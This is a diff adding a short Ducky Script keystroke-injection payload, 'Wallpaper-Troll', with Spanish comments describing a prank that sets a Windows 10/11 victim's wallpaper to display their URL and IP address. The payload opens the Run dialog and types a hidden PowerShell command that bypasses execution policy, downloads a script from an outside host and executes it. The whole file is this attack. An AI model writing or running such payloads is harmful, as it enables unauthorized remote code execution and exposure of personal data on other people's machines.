@@ -1,0 +1,16 @@
+REM     Titulo: Wallpaper-Troll
+REM
+REM     Autor: Ian Pearce
+REM
+REM     Descripción: (Cambia el fondo de pantalla con la url e ip del usuario accediendo a los datos mediante el PowerShell) 
+REM     Objetivo: Windows 10, 11
+REM
+REM     --------------------------------------------------------------------------------------
+REM   
+REM     --------------------------------------------------------------------------------------
+REM
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $url='';irm jakoby.lol/pkw | iex
+DELAY 500
+ENTER
